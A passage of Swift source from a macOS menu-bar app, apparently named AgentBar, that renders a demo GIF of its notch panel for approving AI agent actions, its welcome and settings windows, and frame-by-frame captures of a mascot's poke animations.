            NSGraphicsContext.restoreGraphicsState()
            NSGraphicsContext.saveGraphicsState()
            Stage.rounded(r, 22).addClip()
            rep.draw(in: r)
            NSGraphicsContext.restoreGraphicsState()
            return (r, scale * 2)          // points in the window → pixels on the canvas
        }
        func point(_ f: NSRect, in r: NSRect, _ k: CGFloat) -> NSPoint {
            NSPoint(x: r.minX + f.midX * k, y: r.minY + f.midY * k)
        }

        // Scene 2's windows, one per mode.
        let modes: [Presentation] = [.island, .menuBar, .both]
        let frame0 = sprite.colorFrames.first ?? sprite.restingColor
        var welcome: [Presentation: (NSBitmapImageRep, [NSRect])] = [:]
        for m in modes {
            if let r = WelcomeWindow.shared.renderForVerification(mode: m, mark: frame0, word: "Thinking",
                                                                wired: ["claude", "codex", "copilot"]) {
                welcome[m] = (r.image, r.radioFrames)
            }
        }
        // Scene 3's pages.
        let pages: [SettingsWindow.Page] = [.notifications, .general, .shortcuts]
        var settings: [SettingsWindow.Page: NSBitmapImageRep] = [:]
        var sidebar: [SettingsWindow.Page: NSRect] = [:]
        let dir = URL(fileURLWithPath: NSTemporaryDirectory()).appendingPathComponent("agentbar-gifs")
        for p in pages {
            let file = dir.appendingPathComponent("settings-\(p.rawValue).png")
            _ = SettingsWindow.shared.renderPageForVerification(p, to: file)
            if let d = try? Data(contentsOf: file), let rep = NSBitmapImageRep(data: d) { settings[p] = rep }
            sidebar[p] = SettingsWindow.shared.sidebarFrame(of: p)
        }

        /// Opening from the pill (0) to the panel (1), the outline recut every step.
        func openIsland(_ img: NSImage, _ t: CGFloat) {
            let panelRect = NSRect(x: (W - img.size.width) / 2, y: topY - img.size.height,
                                   width: img.size.width, height: img.size.height)
            let (r, ear) = Stage.growing(pill: pillRect, panel: panelRect, t: t, topY: topY)
            let outline = Stage.island(r, ear: ear)
            NSGraphicsContext.saveGraphicsState(); shadow.set()
            Stage.fill(outline, .black)
            NSGraphicsContext.restoreGraphicsState()
            if t > 0.5 {
                NSGraphicsContext.saveGraphicsState(); Stage.clip(outline)
                img.draw(in: panelRect, from: .zero, operation: .sourceOver, fraction: (t - 0.5) / 0.5)
                NSGraphicsContext.restoreGraphicsState()
            }
        }

        let peekLength = 76
        let start = NSPoint(x: W - 180, y: 300), notchPt = NSPoint(x: W / 2 + 30, y: topY - 20)
        func scene(_ frame: Int) -> CGImage {
            // Everything after the peek scene runs on the clock it had before it.
            let f = frame >= 96 + peekLength ? frame - peekLength : frame
            return Stage.frame(W, H) {
                Stage.wallpaper(W, H)
                let mk = sprite.colorFrames.isEmpty ? sprite.restingColor
                                                    : sprite.colorFrames[frame % sprite.colorFrames.count]
                var cur: NSPoint?
                var pressed = false
                if frame >= 96, frame < 96 + peekLength {
                    let p = frame - 96
                    Stage.menuBar(W, H, app: "iTerm2", notch: true)
                    caption(p < 30 ? "Hidden while you're away · reach for the notch and it's back"
                                   : "Poke the mascot (opt-in) · three quick clicks and it's dizzy")
                    let busyRect = NSRect(x: (W - busyImg.size.width) / 2, y: topY - busyImg.size.height,
                                          width: busyImg.size.width, height: busyImg.size.height)
                    let markPt = NSPoint(x: busyRect.minX + markAt.midX * 2,
                                         y: busyRect.minY + markAt.midY * 2)
                    let pokeAt = [42, 47, 52]
                    // The hover zone is the menu-bar strip over the notch, not the pill.
                    let zonePt = NSPoint(x: W / 2 + 30, y: topY + 30)
                    switch p {
                    case 0..<12:                    // nothing under the notch; the pointer arrives
                        cur = Stage.lerp(start, zonePt, Stage.smooth(CGFloat(p) / 11))
                    case 12..<22:                   // the pill peeks back, then stays
                        let t = Stage.smooth(CGFloat(p - 12) / 3)
                        pill("Pushing…", color: .white, mark: mk, count: 3, alpha: t, drop: 12 * (1 - t))
                        cur = zonePt
                    case 22..<30: openIsland(busyImg, Stage.smooth(CGFloat(p - 22) / 8)); cur = zonePt
                    default:
                        // The last poke that has landed, and how far into its reaction.
                        if let i = pokeAt.lastIndex(where: { p >= $0 }),
                           let img = pokes[i].frame(at: Double(p - pokeAt[i]) * 0.085) {
                            openIsland(blankImg, 1)
                            img.draw(in: NSRect(x: markPt.x - img.size.width / 2,
                                                y: busyRect.minY + markAt.minY * 2 - Poke.pad * 2,
                                                width: img.size.width, height: img.size.height))
                        } else {
                            openIsland(busyImg, 1)
                        }
                        let aim = NSPoint(x: markPt.x + 14, y: markPt.y - 10)
                        cur = Stage.lerp(zonePt, aim, Stage.smooth(CGFloat(p - 30) / 10))
                        pressed = pokeAt.contains { p >= $0 - 2 && p < $0 }
                    }
                } else if f < 96 {
                    Stage.menuBar(W, H, app: "iTerm2", notch: true)
                    caption("Allow or deny from the notch · Claude, Codex, Copilot and more")
                    func open(_ t: CGFloat) { openIsland(panelImg, t) }
                    switch f {
                    case 0..<20:
                        pill("approve?", color: .white, mark: mk, count: 3)
                        cur = Stage.lerp(start, notchPt, Stage.smooth(CGFloat(f - 4) / 14))
                    case 20..<28: open(Stage.smooth(CGFloat(f - 20) / 8)); cur = notchPt
                    case 28..<52:
                        open(1)
                        cur = Stage.lerp(notchPt, allowPt, Stage.smooth(CGFloat(f - 30) / 14))
                        pressed = f >= 48
                    case 52..<58: open(Stage.smooth(1 - CGFloat(f - 52) / 6)); cur = allowPt
                    case 58..<76:
                        pill("✓ Allowed", color: Stage.rgb(0x59D973), mark: nil, count: 0)
                        cur = Stage.lerp(allowPt, start, Stage.smooth(CGFloat(f - 58) / 16))
                    default: pill("Pushing…", color: .white, mark: mk, count: 3)
                    }
                } else if f < 176 {
                    Stage.menuBar(W, H, app: "AgentBar", notch: true)
                    caption("Menu bar, Dynamic Island, or both")
                    let order: [(Int, Presentation)] = [(96, .island), (118, .menuBar), (146, .both)]
                    let mode = order.last(where: { f >= $0.0 })!.1
                    if let (rep, radios) = welcome[mode] {
                        let (r, k) = window(rep)
                        let target: Presentation = f < 118 ? .menuBar : .both
                        let idx = Presentation.allCases.firstIndex(of: target)!
                        let aim = radios.indices.contains(idx) ? point(radios[idx], in: r, k) : NSPoint(x: W / 2, y: H / 2)
                        let from = f < 118 ? NSPoint(x: W - 200, y: 260) : point(radios[Presentation.allCases.firstIndex(of: .menuBar)!], in: r, k)
                        let t0 = f < 118 ? 100 : 124
                        cur = f >= 146 ? aim : Stage.lerp(from, aim, Stage.smooth(CGFloat(f - t0) / 14))
                        pressed = (f >= 116 && f < 119) || (f >= 144 && f < 147)
                        cur = cur.map { NSPoint(x: $0.x - 20, y: $0.y + 10) }
                    }
                } else {
                    Stage.menuBar(W, H, app: "AgentBar", notch: true)
                    caption("Notifications, sounds, global shortcuts: all in Settings")
                    let order: [(Int, SettingsWindow.Page)] = [(176, .notifications), (204, .general),
                                                                (234, .shortcuts)]
                    let page = order.last(where: { f >= $0.0 })!.1
                    if let rep = settings[page] {
                        let (r, k) = window(rep, top: 90)
                        if let next = order.first(where: { $0.0 > f }), let side = sidebar[next.1] {
                            let aim = NSPoint(x: r.minX + side.minX * k + 70, y: r.minY + side.midY * k)
                            let prev = sidebar[page].map { NSPoint(x: r.minX + $0.minX * k + 70, y: r.minY + $0.midY * k) }
                                ?? NSPoint(x: W - 200, y: 260)
                            let t = Stage.smooth(CGFloat(f - (next.0 - 16)) / 12)
                            cur = f < next.0 - 16 ? prev : Stage.lerp(prev, aim, t)
                            pressed = f >= next.0 - 3
                        } else if let side = sidebar[page] {
                            cur = NSPoint(x: r.minX + side.minX * k + 70, y: r.minY + side.midY * k)
                        }
                    }
                }
                if let cur { Stage.cursor(at: cur, pressed: pressed) }
            }
        }

        var frames: [CGImage] = []
        let total = 280 + peekLength
        for f in 0..<total { frames.append(scene(f)) }
        // Soften the two cuts between scenes: four frames of cross-fade each.
        func blend(_ a: CGImage, _ b: CGImage, _ t: CGFloat) -> CGImage {
            Stage.frame(W, H) {
                NSImage(cgImage: a, size: NSSize(width: W, height: H)).draw(in: NSRect(x: 0, y: 0, width: W, height: H))
                NSImage(cgImage: b, size: NSSize(width: W, height: H))
                    .draw(in: NSRect(x: 0, y: 0, width: W, height: H), from: .zero, operation: .sourceOver, fraction: t)
            }
        }
        for cut in [96, 96 + peekLength, 176 + peekLength] {
            let a = frames[cut - 1], b = frames[cut]
            for i in 0..<4 { frames[cut - 4 + i] = blend(a, b, CGFloat(i + 1) / 5) }
        }
        Stage.writeGIF(frames, delay: 0.085, to: url)
    }
}

// MARK: - The poked mascot

/// Clawd's reactions in the open panel, played by the app's own code and read back
/// a frame at a time. `cacheDisplay` never sees Core Animation, so the snapshot
/// draws the mark at rest; this pokes the real `IslandMascotView` through
/// `IslandMascot` — the decision, squish or dizzy, is `MascotPersonality.Pokes`'s —
/// then takes the animations the view added off its layers and evaluates them at
/// the frame's time, setting each value on the model layer and rendering the tree.
struct Poke {
    /// Room around the view for a squish wider than the mark and stars over its head.
    static let pad: CGFloat = 14

    private let view: IslandMascotView
    private let tracks: [(layer: CALayer, animation: CAAnimation)]
    private let length: TimeInterval

    /// Three pokes in a row, the way a hand would land them: squish, squish, dizzy.
    /// The personality is off by default and this process's defaults are its own
    /// domain (Scripts/demo/README.md), so it is switched on here for the picture
    /// and the value cleared again before anything else is drawn.
    static func record(_ view: IslandMascotView, session id: String) -> [Poke] {
        MascotPersonality.Prefs.enabled = true
        defer { UserDefaults.standard.removeObject(forKey: MascotPersonality.Prefs.key) }
        let personality = IslandMascot()
        personality.attach(view, session: id)
        guard view.onPoke != nil else { fatalError("the mascot will not take a poke — Reduce Motion is on?") }
        let click = NSEvent.mouseEvent(with: .leftMouseUp, location: .zero, modifierFlags: [], timestamp: 0,
                                       windowNumber: 0, context: nil, eventNumber: 0, clickCount: 1,
                                       pressure: 0)!
        var out: [Poke] = []
        for _ in 0..<3 {
            view.mouseUp(with: click)
            var tracks: [(CALayer, CAAnimation)] = []
            func collect(_ l: CALayer) {
                for key in l.animationKeys() ?? [] {
                    if let a = l.animation(forKey: key) { tracks.append((l, a)) }
                    l.removeAnimation(forKey: key)
                }
                for s in l.sublayers ?? [] { collect(s) }
            }
            if let root = view.layer { collect(root) }
            out.append(Poke(view: view, tracks: tracks, length: tracks.map(\.1.duration).max() ?? 0))
        }
        return out
    }

    /// The view as it looks `t` seconds into this reaction, at 2x, padded by `pad`;
    /// nil once the reaction is over and the mark is back at rest.
    func frame(at t: TimeInterval) -> NSImage? {
        guard t < length, let root = view.layer else { return nil }
        CATransaction.begin()
        CATransaction.setDisableActions(true)
        // A transform track starts from rest, so a squish's last value does not
        // carry into the dizzy beat. Only those layers: the ring's flattening is a
        // transform the view set, not one it animates.
        for (layer, a) in tracks where (a as? CAPropertyAnimation)?.keyPath?.hasPrefix("transform") == true {
            layer.transform = CATransform3DIdentity
        }
        for (layer, a) in tracks {
            guard let path = (a as? CAPropertyAnimation)?.keyPath else { continue }
            let p = max(0, min(1, t / a.duration))
            if let k = a as? CAKeyframeAnimation, let values = k.values {
                let times = k.keyTimes?.map(\.doubleValue)
                    ?? values.indices.map { Double($0) / Double(max(1, values.count - 1)) }
                let i = max(0, (times.lastIndex { $0 <= p } ?? 0))
                let j = min(values.count - 1, i + 1)
                let u = times[j] > times[i] ? (p - times[i]) / (times[j] - times[i]) : 0
                layer.setValue(Self.mix(values[i], values[j], u), forKeyPath: path)
            } else if let b = a as? CABasicAnimation, let from = b.fromValue, let to = b.toValue {
                layer.setValue(Self.mix(from, to, p), forKeyPath: path)
            }
        }
        CATransaction.commit()

        let size = NSSize(width: view.bounds.width + Self.pad * 2, height: view.bounds.height + Self.pad * 2)
        let rep = NSBitmapImageRep(bitmapDataPlanes: nil, pixelsWide: Int(size.width * 2),
                                   pixelsHigh: Int(size.height * 2), bitsPerSample: 8, samplesPerPixel: 4,
                                   hasAlpha: true, isPlanar: false, colorSpaceName: .deviceRGB,
                                   bytesPerRow: 0, bitsPerPixel: 0)!
        NSGraphicsContext.saveGraphicsState()
        NSGraphicsContext.current = NSGraphicsContext(bitmapImageRep: rep)
        let cg = NSGraphicsContext.current!.cgContext
        cg.scaleBy(x: 2, y: 2)
        cg.translateBy(x: Self.pad, y: Self.pad)
        // `render(in:)` draws CGImage contents but not the wrapper AppKit puts in a
        // layer for an NSImage, so the image layer holds the same picture as a
        // CGImage for the render and gets its own contents back after.
        let held = root.sublayers?.first { $0.contents != nil }
        let original = held?.contents
        held?.contents = view.image?.cgImage(forProposedRect: nil, context: nil, hints: nil)
        root.render(in: cg)
        held?.contents = original
        NSGraphicsContext.restoreGraphicsState()
        let img = NSImage(size: NSSize(width: size.width * 2, height: size.height * 2))
        img.addRepresentation(rep)
        return img
    }

    /// Linear between two keyframe values: numbers, or the squish's scale matrices.
    private static func mix(_ a: Any, _ b: Any, _ u: Double) -> Any {
        if let x = a as? NSNumber, let y = b as? NSNumber {
            return NSNumber(value: x.doubleValue + (y.doubleValue - x.doubleValue) * u)
        }
        if let x = (a as? NSValue)?.caTransform3DValue, let y = (b as? NSValue)?.caTransform3DValue {
            let m = CGFloat(u)
            var r = x
            r.m11 += (y.m11 - x.m11) * m; r.m22 += (y.m22 - x.m22) * m; r.m33 += (y.m33 - x.m33) * m
            r.m41 += (y.m41 - x.m41) * m; r.m42 += (y.m42 - x.m42) * m
            return NSValue(caTransform3D: r)
        }
        return u < 0.5 ? a : b
    }
}
